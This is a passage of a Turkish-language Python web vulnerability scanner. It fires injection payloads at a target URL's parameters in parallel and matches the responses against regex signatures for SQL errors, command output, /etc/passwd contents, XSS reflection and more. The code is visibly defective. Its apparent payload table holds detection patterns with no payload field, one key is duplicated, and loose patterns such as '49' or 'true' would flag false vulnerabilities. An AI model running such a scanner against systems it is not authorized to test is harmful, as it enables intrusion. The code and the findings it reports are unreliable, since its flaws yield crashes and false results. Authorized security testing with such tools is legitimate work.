    {"desen": r"Memcached.*connection failed", "guven": 0.85, "aciklama": "Memcached bağlantı hatası"},
    {"desen": r"APC.*cache full", "guven": 0.8, "aciklama": "APC cache dolu"},
    
    # Güvenlik Açığına İşaret Eden Başlıklar
    {"desen": r"Password.*Reset", "guven": 0.8, "aciklama": "Şifre sıfırlama sayfası"},
    {"desen": r"Admin.*Login", "guven": 0.85, "aciklama": "Admin giriş sayfası"},
    {"desen": r"Database.*Management", "guven": 0.9, "aciklama": "Veritabanı yönetim arayüzü"},
    {"desen": r"phpMyAdmin", "guven": 0.9, "aciklama": "phpMyAdmin arayüzü"},
    {"desen": r"Adminer", "guven": 0.9, "aciklama": "Adminer veritabanı arayüzü"},
    {"desen": r"Web.*Console", "guven": 0.85, "aciklama": "Web console arayüzü"},
    
    # Log ve İzleme Dosyaları
    {"desen": r"access\.log|error\.log", "guven": 0.9, "aciklama": "Log dosyası ifşası"},
    {"desen": r"catalina\.out", "guven": 0.9, "aciklama": "Tomcat log dosyası"},
    {"desen": r"application\.log", "guven": 0.85, "aciklama": "Uygulama log dosyası"},
    {"desen": r"debug\.log", "guven": 0.9, "aciklama": "Debug log dosyası"},
    {"desen": r"error_log", "guven": 0.9, "aciklama": "PHP error log"},
    
    # Network ve Firewall Bilgileri
    {"desen": r"iptables.*DROP", "guven": 0.8, "aciklama": "Iptables kuralı ifşası"},
    {"desen": r"firewall.*rule", "guven": 0.8, "aciklama": "Firewall kural bilgisi"},
    {"desen": r"netstat.*LISTEN", "guven": 0.85, "aciklama": "Açık port bilgisi"},
    {"desen": r"ping.*unreachable", "guven": 0.7, "aciklama": "Network erişim hatası"},
    
    # Özel Uygulama Hataları
    {"desen": r"Elasticsearch.*exception", "guven": 0.85, "aciklama": "Elasticsearch hatası"},
    {"desen": r"MongoDB.*error", "guven": 0.85, "aciklama": "MongoDB veritabanı hatası"},
    {"desen": r"Docker.*container.*failed", "guven": 0.8, "aciklama": "Docker container hatası"},
    {"desen": r"Kubernetes.*pod.*error", "guven": 0.8, "aciklama": "Kubernetes pod hatası"},
    {"desen": r"Jenkins.*build.*failed", "guven": 0.8, "aciklama": "Jenkins build hatası"},
    
    # Mobil ve API Özel Hataları
    {"desen": r"Android.*WebView.*error", "guven": 0.8, "aciklama": "Android WebView hatası"},
    {"desen": r"iOS.*WKWebView.*error", "guven": 0.8, "aciklama": "iOS WebView hatası"},
    {"desen": r"React.*Native.*error", "guven": 0.8, "aciklama": "React Native hatası"},
    {"desen": r"GraphQL.*syntax.*error", "guven": 0.85, "aciklama": "GraphQL syntax hatası"},
    {"desen": r"WebSocket.*connection.*failed", "guven": 0.8, "aciklama": "WebSocket bağlantı hatası"},
    
    # Cloud ve DevOps Hataları
    {"desen": r"AWS.*S3.*AccessDenied", "guven": 0.85, "aciklama": "AWS S3 erişim hatası"},
    {"desen": r"Azure.*unauthorized", "guven": 0.85, "aciklama": "Microsoft Azure yetki hatası"},
    {"desen": r"Google.*Cloud.*permission", "guven": 0.85, "aciklama": "Google Cloud izin hatası"},
    {"desen": r"Terraform.*error", "guven": 0.8, "aciklama": "Terraform infrastructure hatası"},
    {"desen": r"Ansible.*failed", "guven": 0.8, "aciklama": "Ansible otomasyon hatası"},
    
    # Gelişmiş Güvenlik Test Desenleri
    {"desen": r"Content-Type.*boundary=", "guven": 0.7, "aciklama": "Multipart form boundary"},
    {"desen": r"charset=.*utf-8", "guven": 0.6, "aciklama": "Character encoding bilgisi"},
    {"desen": r"Expires.*Thu.*01.*Jan.*1970", "guven": 0.7, "aciklama": "Cache bypass header"},
    {"desen": r"Last-Modified.*GMT", "guven": 0.6, "aciklama": "Son değişiklik tarihi"},
    {"desen": r"ETag.*W/", "guven": 0.6, "aciklama": "Weak ETag header"},
    {"desen": r"Via.*proxy", "guven": 0.8, "aciklama": "Proxy server bilgisi"},
    {"desen": r"X-Forwarded-For", "guven": 0.8, "aciklama": "Proxy IP forward header"},
    {"desen": r"X-Real-IP", "guven": 0.8, "aciklama": "Gerçek IP header"},
    {"desen": r"X-Original-URL", "guven": 0.85, "aciklama": "Orijinal URL header"},
    {"desen": r"Server: Apache|nginx", "guven": 0.8, "aciklama": "Sunucu bilgisi ifşası"}
],

ZafiyetTipi.INFO_DISCLOSURE: [
    {"desen": r"internal server error", "guven": 0.9, "aciklama": "Sunucu iç hatası"},
    {"desen": r"exception.*?at.*?line", "guven": 0.85, "aciklama": "İstisna yığını ifşası"}
],


        }
    
    def payloadlari_al(self, zafiyet_tipi: ZafiyetTipi) -> List[Dict]:
        """Belirli bir güvenlik açığı türü için payload'ları getir"""
        return self.payloadlar.get(zafiyet_tipi, [])

class ZafiyetAlgilayici:
    """Gelişmiş güvenlik açığı algılama sistemi"""
    
    def __init__(self):
        self.algilama_desenleri = self._algilama_desenlerini_yukle()
    
    def _algilama_desenlerini_yukle(self) -> Dict[ZafiyetTipi, List[Dict]]:
        """Tüm güvenlik açığı türleri için kapsamlı algılama desenleri"""
        return {
            ZafiyetTipi.XSS: [
                {"desen": r"<script.*?>.*?alert.*?</script>", "guven": 0.95, "aciklama": "Script etiketi algılandı"},
                {"desen": r"alert\(['\"].*?['\"]\)", "guven": 0.9, "aciklama": "Alert fonksiyonu çağrısı"},
                {"desen": r"<svg.*?onload.*?alert", "guven": 0.85, "aciklama": "SVG onload eventi"},
                {"desen": r"<img.*?onerror.*?alert", "guven": 0.85, "aciklama": "IMG onerror eventi"},
                {"desen": r"javascript:.*?alert", "guven": 0.8, "aciklama": "JavaScript pseudo protokolü"},
                {"desen": r"<iframe.*?src.*?javascript:", "guven": 0.85, "aciklama": "Iframe javascript kaynağı"},
                {"desen": r"onload.*?=.*?alert", "guven": 0.8, "aciklama": "Onload event handler"},
                {"desen": r"onerror.*?=.*?alert", "guven": 0.8, "aciklama": "Onerror event handler"}
            ],
            
            ZafiyetTipi.SQLI: [
                {"desen": r"SQL syntax.*?error", "guven": 0.95, "aciklama": "SQL sözdizimi hatası"},
                {"desen": r"mysql_fetch_array\(\)", "guven": 0.9, "aciklama": "MySQL PHP hatası"},
                {"desen": r"ORA-[0-9]{5}", "guven": 0.95, "aciklama": "Oracle hata kodu"},
                {"desen": r"Microsoft OLE DB Provider", "guven": 0.9, "aciklama": "Microsoft SQL hatası"},
                {"desen": r"PostgreSQL.*?ERROR", "guven": 0.95, "aciklama": "PostgreSQL hatası"},
                {"desen": r"Warning.*?mysql_", "guven": 0.85, "aciklama": "MySQL uyarısı"},
                {"desen": r"SQLite.*?error", "guven": 0.9, "aciklama": "SQLite hatası"},
                {"desen": r"OLE DB.*?error", "guven": 0.85, "aciklama": "OLE DB hatası"},
                {"desen": r"SQL Server.*?error", "guven": 0.9, "aciklama": "SQL Server hatası"},
                {"desen": r"Unclosed quotation mark", "guven": 0.85, "aciklama": "Kapatılmamış tırnak işareti"},
                {"desen": r"quoted string not properly terminated", "guven": 0.85, "aciklama": "Düzgün sonlandırılmamış string"}
            ],
            
            ZafiyetTipi.CMDI: [
                {"desen": r"uid=\d+.*?gid=\d+", "guven": 0.95, "aciklama": "Unix kullanıcı ID bilgisi"},
                {"desen": r"root:x:0:0:", "guven": 0.95, "aciklama": "Root kullanıcı girişi"},
                {"desen": r"Linux.*?\d+\.\d+\.\d+", "guven": 0.9, "aciklama": "Linux kernel versiyon bilgisi"},
                {"desen": r"Microsoft Windows \[Version", "guven": 0.9, "aciklama": "Windows versiyon bilgisi"},
                {"desen": r"Directory of [C-Z]:\\", "guven": 0.85, "aciklama": "Windows dizin listeleme"},
                {"desen": r"total \d+", "guven": 0.8, "aciklama": "Unix ls komutu çıktısı"},
                {"desen": r"drwx.*?root.*?root", "guven": 0.85, "aciklama": "Unix dosya izinleri"},
                {"desen": r"PID.*?TTY.*?TIME.*?CMD", "guven": 0.85, "aciklama": "Unix ps komutu başlığı"},
                {"desen": r"Active Internet connections", "guven": 0.8, "aciklama": "Netstat komutu çıktısı"},
                {"desen": r"inet addr:", "guven": 0.8, "aciklama": "ifconfig komutu çıktısı"}
            ],
            
            ZafiyetTipi.LFI: [
                {"desen": r"root:x:0:0:root:", "guven": 0.95, "aciklama": "Linux passwd dosyası"},
                {"desen": r"# localhost name resolution", "guven": 0.9, "aciklama": "Hosts dosyası yorumu"},
                {"desen": r"\[boot loader\]", "guven": 0.9, "aciklama": "Windows boot.ini dosyası"},
                {"desen": r"for 16-bit app support", "guven": 0.85, "aciklama": "Windows win.ini dosyası"},
                {"desen": r"# This file controls the state", "guven": 0.8, "aciklama": "Sistem konfigürasyon dosyası"},
                {"desen": r"LoadModule.*?apache", "guven": 0.85, "aciklama": "Apache konfigürasyon dosyası"},
                {"desen": r"\[mysql\]", "guven": 0.8, "aciklama": "MySQL konfigürasyon dosyası"}
            ],
            
            ZafiyetTipi.RFI: [
                {"desen": r"<\?php.*?\?>", "guven": 0.9, "aciklama": "PHP kodu algılandı"},
                {"desen": r"include.*?http://", "guven": 0.85, "aciklama": "HTTP include algılandı"},
                {"desen": r"Warning.*?include", "guven": 0.8, "aciklama": "Include uyarısı"},
                {"desen": r"failed to open stream", "guven": 0.8, "aciklama": "Stream açma hatası"}
            ],
            
            ZafiyetTipi.XXE: [
                {"desen": r"root:x:0:0:root:", "guven": 0.95, "aciklama": "XXE ile dosya okuma"},
                {"desen": r"ENTITY.*?SYSTEM", "guven": 0.9, "aciklama": "XXE entity bildirimi"},
                {"desen": r"XML Parsing Error", "guven": 0.8, "aciklama": "XML ayrıştırma hatası"}
            ],
            
            ZafiyetTipi.SSTI: [
                {"desen": r"49", "guven": 0.8, "aciklama": "7*7 matematik işlemi sonucu"},
                {"desen": r"<Config.*?>", "guven": 0.9, "aciklama": "Konfigürasyon nesne erişimi"},
                {"desen": r"<Request.*?>", "guven": 0.85, "aciklama": "Request nesne erişimi"},
                {"desen": r"<class.*?object.*?>", "guven": 0.8, "aciklama": "Python sınıf nesnesi"}
            ],
            
            ZafiyetTipi.LDAP: [
                {"desen": r"uid=.*?,ou=", "guven": 0.9, "aciklama": "LDAP kullanıcı bilgisi"},
                {"desen": r"LDAP.*?error", "guven": 0.85, "aciklama": "LDAP hatası"},
                {"desen": r"Invalid DN syntax", "guven": 0.8, "aciklama": "LDAP DN sözdizimi hatası"}
            ],
            
            ZafiyetTipi.NOSQL: [
                {"desen": r"MongoError", "guven": 0.9, "aciklama": "MongoDB hatası"},
                {"desen": r"CouchDB.*?error", "guven": 0.85, "aciklama": "CouchDB hatası"},
                {"desen": r"true", "guven": 0.7, "aciklama": "NoSQL boolean bypass"}
            ],
            
            ZafiyetTipi.SSRF: [
                {"desen": r"Connection refused", "guven": 0.8, "aciklama": "Bağlantı reddedildi"},
                {"desen": r"metadata", "guven": 0.85, "aciklama": "Metadata erişimi"},
                {"desen": r"localhost", "guven": 0.7, "aciklama": "Localhost erişimi"}
            ],
            # EKLENMİŞLER 
            ZafiyetTipi.IDOR: [
                {"desen": r"Unauthorized", "guven": 0.9, "aciklama": "Yetkisiz erişim"}
            ],
            ZafiyetTipi.CSRF: [
                {"desen": r"Cross-Site Request Forgery", "guven": 0.9, "aciklama": "CSRF koruması eksik"},
                {"desen": r"csrf_token", "guven": 0.85, "aciklama": "CSRF token eksik"},
            ],
            ZafiyetTipi.OPEN_REDIRECT: [
    {"desen": r"redirect.*?http", "guven": 0.85, "aciklama": "Açık yönlendirme HTTP içeriyor"},
    {"desen": r"window\.location\s*=\s*['\"]http", "guven": 0.8, "aciklama": "JavaScript açık yönlendirme"}
],

ZafiyetTipi.CLICKJACKING: [
    {"desen": r"<iframe.*?>", "guven": 0.85, "aciklama": "Clickjacking için iframe kullanımı"},
    {"desen": r"x-frame-options", "guven": 0.7, "aciklama": "X-Frame-Options eksikliği"}
],

ZafiyetTipi.FILE_UPLOAD: [
    {"desen": r"Content-Disposition: form-data; name=.*?filename=", "guven": 0.9, "aciklama": "Dosya yükleme parametresi"},
    {"desen": r"\.php|\.exe|\.jsp", "guven": 0.85, "aciklama": "Tehlikeli uzantı içeren dosya"}
],

ZafiyetTipi.AUTH_BYPASS: [
    {"desen": r"logged_in.*?false", "guven": 0.9, "aciklama": "Yetki atlama denemesi"},
    {"desen": r"admin.*?=0", "guven": 0.85, "aciklama": "Admin yetkisi atlama"}
],

ZafiyetTipi.MISCONFIG: [
    {"desen": r"Index of /", "guven": 0.9, "aciklama": "Açık dizin listeleme"},
    {"desen": r"Server: Apache|nginx", "guven": 0.8, "aciklama": "Sunucu bilgisi ifşası"}
],

ZafiyetTipi.INFO_DISCLOSURE: [
    {"desen": r"internal server error", "guven": 0.9, "aciklama": "Sunucu iç hatası"},
    {"desen": r"exception.*?at.*?line", "guven": 0.85, "aciklama": "İstisna yığını ifşası"}
],

        }
    
    def zafiyet_algiyla(self, yanit_metni: str, zafiyet_tipi: ZafiyetTipi, 
                       payload: str) -> Tuple[bool, float, str]:
        """Yanıtın güvenlik açığını gösterip göstermediğini algıla"""
        desenler = self.algilama_desenleri.get(zafiyet_tipi, [])
        
        # XSS için payload yansımasını kontrol et
        if zafiyet_tipi == ZafiyetTipi.XSS and payload in yanit_metni:
            return True, 0.95, f"Payload yansıtıldı: {payload[:100]}"
        
        # Algılama desenlerini kontrol et
        for desen_bilgisi in desenler:
            desen = desen_bilgisi["desen"]
            guven = desen_bilgisi["guven"]
            aciklama = desen_bilgisi["aciklama"]
            
            eslesme = re.search(desen, yanit_metni, re.IGNORECASE | re.DOTALL)
            if eslesme:
                parcacik = eslesme.group(0)[:200]
                return True, guven, f"{aciklama}: {parcacik}"
        
        return False, 0.0, ""

class GuvenlikTarayicisi:
    """Ana güvenlik tarayıcı sınıfı - Muhammed Cengiz"""
    
    def __init__(self, yapilandirma: TaramaYapilandirmasi):
        self.yapilandirma = yapilandirma
        self.payload_yoneticisi = PayloadYoneticisi()
        self.algilayici = ZafiyetAlgilayici()
        self.oturum = self._oturum_ayarla()
        self.sonuclar: List[ZafiyetSonucu] = []
        self.kilit = threading.Lock()
        self.test_sayisi = 0
        self.basarili_saldiri_sayisi = 0
        
    def _oturum_ayarla(self) -> requests.Session:
        """İstek oturumunu uygun yapılandırma ile ayarla"""
        oturum = requests.Session()
        oturum.headers.update({
            'User-Agent': self.yapilandirma.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
        
        if not self.yapilandirma.ssl_dogrula:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
        return oturum
    
    def _istek_gonder(self, url: str, parametreler: Dict[str, str]) -> Optional[requests.Response]:
        """Hata yönetimi ile HTTP isteği gönder"""
        try:
            yanit = self.oturum.get(
                url,
                params=parametreler,
                timeout=self.yapilandirma.timeout,
                allow_redirects=self.yapilandirma.yonlendirmeleri_takip_et,
                verify=self.yapilandirma.ssl_dogrula
            )
            return yanit
        except requests.exceptions.RequestException as e:
            logger.warning(f"{Renkler.SARI}İstek başarısız {url}: {e}{Renkler.RESET}")
            return None
    
    def _parametreyi_test_et(self, parametre: str, zafiyet_tipi: ZafiyetTipi) -> List[ZafiyetSonucu]:
        """Belirli bir parametre için belirli güvenlik açığı türünü test et"""
        sonuclar = []
        payloadlar = self.payload_yoneticisi.payloadlari_al(zafiyet_tipi)
        
        print(f"{Renkler.ACIK_MAVI}[TEST] {zafiyet_tipi.value} - Parametre: '{parametre}'{Renkler.RESET}")
        
        for payload_bilgisi in payloadlar:
            payload = payload_bilgisi["payload"]
            payload_guven = payload_bilgisi["guven"]
            aciklama = payload_bilgisi["aciklama"]
            
            with self.kilit:
                self.test_sayisi += 1
            
            logger.debug(f"Test edilen payload: {payload[:50]}... ({aciklama})")
            
            parametreler = {parametre: payload}
            yanit = self._istek_gonder(self.yapilandirma.hedef_url, parametreler)
            
            if yanit is None:
                continue
                
            # Güvenlik açığını algıla
            zafiyet_var, algilama_guven, parcacik = self.algilayici.zafiyet_algiyla(
                yanit.text, zafiyet_tipi, payload
            )
            
            if zafiyet_var:
                # Genel güven hesapla
                genel_guven = (payload_guven + algilama_guven) / 2
                
                # Şiddet seviyesini belirle
                siddet = self._siddet_belirle(zafiyet_tipi, genel_guven)
                
                sonuc = ZafiyetSonucu(
                    zafiyet_tipi=zafiyet_tipi,
                    siddet=siddet,
                    url=self.yapilandirma.hedef_url,
                    parametre=parametre,
                    payload=payload,
                    yanit_ornegi=parcacik,
                    zaman_damgasi=datetime.now(),
                    guven=genel_guven,
                    detay=aciklama
                )
                
                with self.kilit:
                    sonuclar.append(sonuc)
                    self.sonuclar.append(sonuc)
                    self.basarili_saldiri_sayisi += 1
                
                print(f"{Renkler.KIRMIZI}[ZAFIYET BULUNDU!] {zafiyet_tipi.value} - '{parametre}' parametresinde{Renkler.RESET}")
                print(f"{Renkler.SARI}Payload: {payload[:100]}...{Renkler.RESET}")
                print(f"{Renkler.MAGENTA}Güven: %{genel_guven*100:.1f} | Şiddet: {siddet.value}{Renkler.RESET}")
                break  # Bu zafiyet türü için daha fazla payload deneme
            
            # İstekler arası gecikme
            time.sleep(self.yapilandirma.istekler_arasi_gecikme)
        
        return sonuclar
    
    def _siddet_belirle(self, zafiyet_tipi: ZafiyetTipi, guven: float) -> SiddetSeviyesi:
        siddet_haritasi = {
        ZafiyetTipi.XSS: SiddetSeviyesi.ORTA,
        ZafiyetTipi.SQLI: SiddetSeviyesi.YUKSEK,
        ZafiyetTipi.CMDI: SiddetSeviyesi.KRITIK,
        ZafiyetTipi.LFI: SiddetSeviyesi.YUKSEK,
        ZafiyetTipi.RFI: SiddetSeviyesi.KRITIK,
        ZafiyetTipi.XXE: SiddetSeviyesi.YUKSEK,
        ZafiyetTipi.SSTI: SiddetSeviyesi.KRITIK,
        ZafiyetTipi.LDAP: SiddetSeviyesi.ORTA,
        ZafiyetTipi.XPATH: SiddetSeviyesi.ORTA,
        ZafiyetTipi.NOSQL: SiddetSeviyesi.YUKSEK,
        ZafiyetTipi.SSRF: SiddetSeviyesi.KRITIK,
        ZafiyetTipi.IDOR: SiddetSeviyesi.YUKSEK,
        ZafiyetTipi.CSRF: SiddetSeviyesi.ORTA,
        ZafiyetTipi.OPEN_REDIRECT: SiddetSeviyesi.DUSUK,
        ZafiyetTipi.CLICKJACKING: SiddetSeviyesi.ORTA,
        ZafiyetTipi.FILE_UPLOAD: SiddetSeviyesi.KRITIK,
        ZafiyetTipi.AUTH_BYPASS: SiddetSeviyesi.KRITIK,
        ZafiyetTipi.MISCONFIG: SiddetSeviyesi.ORTA,
        ZafiyetTipi.INFO_DISCLOSURE: SiddetSeviyesi.DUSUK,
        
    }

        
        temel_siddet = siddet_haritasi.get(zafiyet_tipi, SiddetSeviyesi.ORTA)
        
        # Güven değerine göre şiddeti ayarla
        if guven >= 0.9:
            return temel_siddet
        elif guven >= 0.7:
            # Şiddeti bir seviye düşür
            siddet_sirasi = [SiddetSeviyesi.DUSUK, SiddetSeviyesi.ORTA, SiddetSeviyesi.YUKSEK, SiddetSeviyesi.KRITIK]
            try:
                mevcut_indeks = siddet_sirasi.index(temel_siddet)
                return siddet_sirasi[max(0, mevcut_indeks - 1)]
            except ValueError:
                return SiddetSeviyesi.ORTA
        else:
            return SiddetSeviyesi.DUSUK
    
    def tara(self) -> List[ZafiyetSonucu]:
        """Kapsamlı güvenlik taraması gerçekleştir"""
        print(f"\n{Renkler.KALIN}{Renkler.MAVI}=" + "="*80 + f"{Renkler.RESET}")
        print(f"{Renkler.KALIN}{Renkler.MAVI}🛡️  GELİŞMİŞ GÜVENLİK TARAYICISI - Muhammed Cengiz{Renkler.RESET}")
        print(f"{Renkler.KALIN}{Renkler.MAVI}=" + "="*80 + f"{Renkler.RESET}")
        print(f"{Renkler.ACIK_MAVI}Hedef URL: {self.yapilandirma.hedef_url}{Renkler.RESET}")
        print(f"{Renkler.ACIK_MAVI}Test Parametreleri: {', '.join(self.yapilandirma.parametreler)}{Renkler.RESET}")
        print(f"{Renkler.MAVI}Tarama Başlangıç: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}{Renkler.RESET}")
        
        baslangic_zamani = time.time()
        
        # Tüm güvenlik açığı türleri için tüm parametreleri test et
        gorevler = []
        for parametre in self.yapilandirma.parametreler:
            for zafiyet_tipi in ZafiyetTipi:
                gorevler.append((parametre, zafiyet_tipi))
        
        toplam_gorev = len(gorevler)
        print(f"{Renkler.SARI}Toplam {toplam_gorev} test gerçekleştirilecek...{Renkler.RESET}\n")
        
        # Testleri paralel olarak çalıştır
        with ThreadPoolExecutor(max_workers=self.yapilandirma.max_worker) as executor:
            future_to_task = {
                executor.submit(self._parametreyi_test_et, param, zafiyet_tipi): (param, zafiyet_tipi)
                for param, zafiyet_tipi in gorevler
            }
            
            tamamlanan = 0
            for future in as_completed(future_to_task):
                param, zafiyet_tipi = future_to_task[future]
                try:
                    future.result()
                    tamamlanan += 1
                    yuzde = (tamamlanan / toplam_gorev) * 100
                    print(f"{Renkler.KOYU_MAVI}[İLERLEME] %{yuzde:.1f} tamamlandı ({tamamlanan}/{toplam_gorev}){Renkler.RESET}")
                except Exception as e:
                    logger.error(f"{Renkler.KIRMIZI}Hata - {param} için {zafiyet_tipi.value}: {e}{Renkler.RESET}")
        
        bitis_zamani = time.time()
        tarama_suresi = bitis_zamani - baslangic_zamani
        
        print(f"\n{Renkler.YESIL}Tarama tamamlandı! Süre: {tarama_suresi:.2f} saniye{Renkler.RESET}")
        
        return self.sonuclar

class RaporUreticisi:
    """Detaylı güvenlik raporları üreten sınıf"""
    
    def __init__(self, sonuclar: List[ZafiyetSonucu], tarama_yapilandirmasi: TaramaYapilandirmasi, 
                 toplam_test: int, basarili_saldiri: int):
        self.sonuclar = sonuclar
        self.tarama_yapilandirmasi = tarama_yapilandirmasi
        self.toplam_test = toplam_test
        self.basarili_saldiri = basarili_saldiri
    
    def konsol_raporu_uret(self) -> None:
        """Renkli konsol raporu üret"""
        print(f"\n{Renkler.KALIN}{Renkler.MAVI}=" + "="*80 + f"{Renkler.RESET}")
        print(f"{Renkler.KALIN}{Renkler.MAVI}📊 DETAYLI GÜVENLİK RAPORU{Renkler.RESET}")
        print(f"{Renkler.KALIN}{Renkler.MAVI}=" + "="*80 + f"{Renkler.RESET}")
        print(f"{Renkler.ACIK_MAVI}Yapımcı: Muhammed Cengiz{Renkler.RESET}")
        print(f"{Renkler.ACIK_MAVI}Hedef URL: {self.tarama_yapilandirmasi.hedef_url}{Renkler.RESET}")
        print(f"{Renkler.ACIK_MAVI}Tarama Tarihi: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}{Renkler.RESET}")
        print(f"{Renkler.ACIK_MAVI}Test Edilen Parametreler: {', '.join(self.tarama_yapilandirmasi.parametreler)}{Renkler.RESET}")
        print(f"{Renkler.SARI}Toplam Test Sayısı: {self.toplam_test}{Renkler.RESET}")
        print(f"{Renkler.MAGENTA}Başarılı Saldırı Sayısı: {self.basarili_saldiri}{Renkler.RESET}")
        print(f"{Renkler.KIRMIZI}Bulunan Güvenlik Açığı Sayısı: {len(self.sonuclar)}{Renkler.RESET}")
        
        if not self.sonuclar:
            print(f"\n{Renkler.KALIN}{Renkler.YESIL}✅ SONUÇ BAŞARILI! 1 SALDIRI BİLE GEÇEMEDİ!{Renkler.RESET}")
            print(f"{Renkler.YESIL}Tüm {self.toplam_test} test başarıyla engellenmiştir.{Renkler.RESET}")
            print(f"{Renkler.YESIL}Sistem güvenlik açıklarına karşı korumalı görünmektedir.{Renkler.RESET}")
            return
        
        print(f"\n{Renkler.KALIN}{Renkler.KIRMIZI}🚨 GÜVENLIK AÇIKLARI TESPİT EDİLDİ!{Renkler.RESET}")
        
        # Sonuçları şiddet seviyesine göre grupla
        siddet_gruplari = {}
        for sonuc in self.sonuclar:
            siddet = sonuc.siddet
            if siddet not in siddet_gruplari:
                siddet_gruplari[siddet] = []
            siddet_gruplari[siddet].append(sonuc)
        
        # Şiddet seviyesine göre sonuçları göster
        for siddet in [SiddetSeviyesi.KRITIK, SiddetSeviyesi.YUKSEK, SiddetSeviyesi.ORTA, SiddetSeviyesi.DUSUK]:
            if siddet in siddet_gruplari:
                renk = self._siddet_rengi_al(siddet)
                print(f"\n{renk}🔥 {siddet.value.upper()} ŞİDDET ({len(siddet_gruplari[siddet])} adet){Renkler.RESET}")
                print(f"{renk}" + "-" * 60 + f"{Renkler.RESET}")
                
                for i, sonuc in enumerate(siddet_gruplari[siddet], 1):
                    print(f"{Renkler.BEYAZ}#{i} {sonuc.zafiyet_tipi.value}{Renkler.RESET}")
                    print(f"   📍 Parametre: {Renkler.SARI}{sonuc.parametre}{Renkler.RESET}")
                    print(f"   💣 Saldırı Türü: {Renkler.MAGENTA}{sonuc.detay}{Renkler.RESET}")
                    print(f"   🎯 Payload: {Renkler.ACIK_MAVI}{sonuc.payload[:100]}{'...' if len(sonuc.payload) > 100 else ''}{Renkler.RESET}")
                    print(f"   📊 Güven Oranı: {Renkler.YESIL}%{sonuc.guven*100:.1f}{Renkler.RESET}")
                    print(f"   🕐 Tespit Zamanı: {Renkler.KOYU_MAVI}{sonuc.zaman_damgasi.strftime('%H:%M:%S')}{Renkler.RESET}")
                    if sonuc.yanit_ornegi:
                        print(f"   🔍 Kanıt: {Renkler.KIRMIZI}{sonuc.yanit_ornegi[:150]}{'...' if len(sonuc.yanit_ornegi) > 150 else ''}{Renkler.RESET}")
                    print()
        
        # Özet istatistikler
        print(f"{Renkler.KALIN}{Renkler.MAVI}📈 İSTATİSTİKLER{Renkler.RESET}")
        print(f"{Renkler.MAVI}" + "-" * 30 + f"{Renkler.RESET}")
        
        zafiyet_tipleri = {}
        for sonuc in self.sonuclar:
            tip = sonuc.zafiyet_tipi.value
            if tip not in zafiyet_tipleri:
                zafiyet_tipleri[tip] = 0
            zafiyet_tipleri[tip] += 1
        
        for tip, sayi in sorted(zafiyet_tipleri.items(), key=lambda x: x[1], reverse=True):
            print(f"   {tip}: {Renkler.KIRMIZI}{sayi} adet{Renkler.RESET}")
        
        print(f"\n{Renkler.KALIN}{Renkler.KIRMIZI}⚠️  ŞİDDETLE TAVSİYE EDİLİR:{Renkler.RESET}")
        print(f"{Renkler.SARI}   • Bu güvenlik açıkları derhal kapatılmalıdır{Renkler.RESET}")
        print(f"{Renkler.SARI}   • Güvenlik duvarı kuralları gözden geçirilmelidir{Renkler.RESET}")
        print(f"{Renkler.SARI}   • Uygulama güvenlik testleri düzenli yapılmalıdır{Renkler.RESET}")
        print(f"{Renkler.KALIN}{Renkler.MAVI}=" + "="*80 + f"{Renkler.RESET}")
    
    def _siddet_rengi_al(self, siddet: SiddetSeviyesi) -> str:
        """Şiddet seviyesine göre renk döndür"""
        renk_haritasi = {
            SiddetSeviyesi.KRITIK: Renkler.KIRMIZI + Renkler.KALIN,
            SiddetSeviyesi.YUKSEK: Renkler.KIRMIZI,
            SiddetSeviyesi.ORTA: Renkler.SARI,
            SiddetSeviyesi.DUSUK: Renkler.ACIK_MAVI
        }
        return renk_haritasi.get(siddet, Renkler.BEYAZ)
    
    def json_raporu_uret(self, dosya_adi: str = "guvenlik_raporu.json") -> None:
        """JSON formatında detaylı rapor üret"""
        rapor_verisi = {
            "tarama_bilgileri": {
                "yapimci": "Muhammed Cengiz",
                "hedef_url": self.tarama_yapilandirmasi.hedef_url,
                "tarama_tarihi": datetime.now().isoformat(),
                "test_edilen_parametreler": self.tarama_yapilandirmasi.parametreler,
                "toplam_test_sayisi": self.toplam_test,
                "basarili_saldiri_sayisi": self.basarili_saldiri,
                "toplam_zafiyet_sayisi": len(self.sonuclar)
            },
            "guvenlik_aciklari": []
        }
        
        for sonuc in self.sonuclar:
            zafiyet_verisi = {
                "tip": sonuc.zafiyet_tipi.value,
                "siddet": sonuc.siddet.value,
                "parametre": sonuc.parametre,
                "payload": sonuc.payload,
                "guven_orani": round(sonuc.guven * 100, 2),
                "zaman_damgasi": sonuc.zaman_damgasi.isoformat(),
                "yanit_ornegi": sonuc.yanit_ornegi,
                "detay": sonuc.detay
            }
            rapor_verisi["guvenlik_aciklari"].append(zafiyet_verisi)
        
        with open(dosya_adi, 'w', encoding='utf-8') as f:
            json.dump(rapor_verisi, f, indent=2, ensure_ascii=False)
        
        logger.info(f"{Renkler.YESIL}JSON raporu kaydedildi: {dosya_adi}{Renkler.RESET}")

def bagimliliklari_yukle():
    """Gerekli bağımlılıkları yükle"""
    gerekli_paketler = ["requests", "urllib3"]
    
    for paket in gerekli_paketler:
        try:
            __import__(paket)
        except ImportError:
            logger.info(f"{Renkler.SARI}{paket} yükleniyor...{Renkler.RESET}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", paket])

def url_dogrula(url: str) -> bool:
    """URL formatını doğrula"""
    try:
        sonuc = urlparse(url)
        return all([sonuc.scheme, sonuc.netloc])
    except:
        return False
    
def banner_goster(): 
    """Başlangıç banner'ını göster"""
    banner = f"""
{Renkler.KALIN}{Renkler.MAVI}
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 

██████╗  █████╗ ██████╗ ████████╗ ██████╗ ██████╗ 
